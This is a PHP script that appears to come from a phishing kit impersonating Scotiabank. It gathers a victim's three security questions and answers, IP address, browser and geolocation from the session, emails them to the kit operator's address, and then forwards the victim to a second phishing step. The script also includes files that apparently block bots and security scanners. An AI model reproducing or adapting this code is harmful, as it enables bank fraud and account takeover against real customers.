<?php
    session_start();
    include './youremail.php';
	include 'blocker.php';
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
				
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
	$a1 =$_SESSION['a1'];
    $a2= $_SESSION['a2'];
    $country = $dump["geoplugin_countryName"];
    $subject = 'SCO Login Q&A [ '.$ip.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ Scotia Q&A ===========|'."\r\n";
    $message .= '|Question 1:  '.$_SESSION['q1']."\r\n";
    $message .= '|Answer 1:   '.$_SESSION['a1']."\r\n";
	$message .= '|Question 2:  '.$_SESSION['q2']."\r\n";
    $message .= '|Answer 2:   '.$_SESSION['a2']."\r\n";
	$message .= '|Question 3:  '.$_SESSION['q3']."\r\n";
    $message .= '|Answer 3:   '.$_SESSION['a3']."\r\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
	
	if (strlen($a1) <= 15 && strlen($a2) <= 15 && $a1 != ""){
	

    mail($to, $subject, $message);
	}
   

    header("Location: Step2.php");
 ?>